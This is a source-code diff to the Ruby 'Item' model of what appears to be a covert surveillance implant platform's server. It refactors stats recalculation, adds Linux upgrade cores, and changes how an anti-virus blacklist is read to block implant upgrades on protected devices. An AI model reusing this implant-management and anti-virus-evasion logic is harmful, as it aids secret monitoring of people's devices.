@@ -89,7 +89,7 @@ class Item
   before_create :do_checksum
   before_update :do_checksum
   before_save :do_checksum
-  
+
   public
 
   def self.reset_dashboard
@@ -100,22 +100,10 @@ class Item
     self.stat.dashboard = {}
     self.save
   end
-
-  # performs global recalculation of stats (to be called periodically)
-  def self.restat
-    begin
-      t = Time.now
-      # to make stat converge in one step, first restat agent, targets, then operations
-      #Item.where(_kind: 'agent').each {|i| i.restat}
-      Item.where(_kind: 'target').each {|i| i.restat}
-      Item.where(_kind: 'operation').each {|i| i.restat}
-      trace :debug, "Restat time: #{Time.now - t}" if RCS::DB::Config.instance.global['PERF']
-    rescue Exception => e
-      trace :fatal, "Cannot restat items: #{e.message}"
-    end
-  end
   
   def restat
+    trace :info, "Recalculating stats for #{self._kind} #{self.name}"
+    t = Time.now
     case self._kind
       when 'operation'
         self.stat.size = 0
@@ -163,6 +151,7 @@ class Item
         end
         self.save
     end
+    trace :debug, "Restat for #{self._kind} #{self.name} performed in #{Time.now - t} secs" if RCS::DB::Config.instance.global['PERF']
   end
 
   def move_target(operation)
@@ -373,6 +362,9 @@ class Item
       when 'osx'
         add_upgrade('inputmanager', File.join(build.tmpdir, 'inputmanager'))
         add_upgrade('driver', File.join(build.tmpdir, 'driver'))
+      when 'linux'
+        add_upgrade('core32', File.join(build.tmpdir, 'core32'))
+        add_upgrade('core64', File.join(build.tmpdir, 'core64'))
       when 'ios'
         add_upgrade('dylib', File.join(build.tmpdir, 'dylib'))
       when 'winmo'
@@ -425,21 +417,26 @@ class Item
     self.filesystem_requests.create!({path: '%USERPROFILE%', depth: 2})
   end
 
+  # This apply only to "target" items.
+  # If a target entity (related to this target item) does not exists,
+  # creates a new one.
+  def create_target_entity
+    return if _kind != 'target'
+
+    entity_path = path + [_id]
+
+    return if Entity.targets.where(path: entity_path).exists?
+
+    Entity.create!(type: :target, level: :automatic, path: entity_path, name: name, desc: desc)
+  end
+
   def create_callback
-    case self._kind
-      when 'target'
-        self.create_target_collections
-        # also create the relative entity
-        Entity.create! do |entity|
-          entity.type = :target
-          entity.level = :automatic
-          entity.path = self.path + [self._id]
-          entity.name = self.name
-          entity.desc = self.desc
-        end
+    if _kind == 'target'
+      create_target_collections
+      create_target_entity
     end
 
-    RCS::DB::PushManager.instance.notify(self._kind, {id: self._id, action: 'create'})
+    RCS::DB::PushManager.instance.notify(_kind, {id: _id, action: 'create'})
   end
 
   def notify_callback
@@ -484,6 +481,8 @@ class Item
         # drop evidence and aggregates
         self.drop_target_collections
 
+        # recalculate stats for the operation
+        self.get_parent.restat
       when 'agent'
         # dropping flag is set only by cascading from target
         unless self[:dropping]
@@ -494,6 +493,8 @@ class Item
           trace :info, "Rebuilding summary for target #{self.get_parent.name}..."
           Aggregate.target(self.path.last).rebuild_summary
           trace :info, "Deleting evidence for agent #{self.name} done."
+          # recalculate stats for the target
+          self.get_parent.restat
         end
       when 'factory'
         # delete all the pushed documents of this factory
@@ -533,15 +534,17 @@ class Item
     installed = device[:data]['content']
 
     # check for installed AV
-    File.readlines(RCS::DB::Config.instance.file('blacklist')).each do |offending|
-      offending.chomp!
-      next unless offending
-      bver, bmatch = offending.split('|')
-      bver = bver.to_i
-      trace :debug, "Checking for #{bmatch} | #{bver} <= #{self.version.to_i}"
-      if Regexp.new(bmatch, Regexp::IGNORECASE).match(installed) != nil && (self.version.to_i <= bver || bver == 0 )
-        trace :warn, "Blacklisted software detected: #{bmatch}"
-        raise BlacklistError.new("The target device contains a software that prevents the upgrade.")
+    File.open(RCS::DB::Config.instance.file('blacklist'), "r:UTF-8") do |f|
+      while offending = f.gets
+        offending.chomp!
+        next unless offending
+        bver, bmatch = offending.split('|')
+        bver = bver.to_i
+        trace :debug, "Checking for #{bmatch} | #{bver} <= #{self.version.to_i}"
+        if Regexp.new(bmatch, Regexp::IGNORECASE).match(installed) != nil && (self.version.to_i <= bver || bver == 0 )
+          trace :warn, "Blacklisted software detected: #{bmatch}"
+          raise BlacklistError.new("The target device contains a software that prevents the upgrade.")
+        end
       end
     end
 
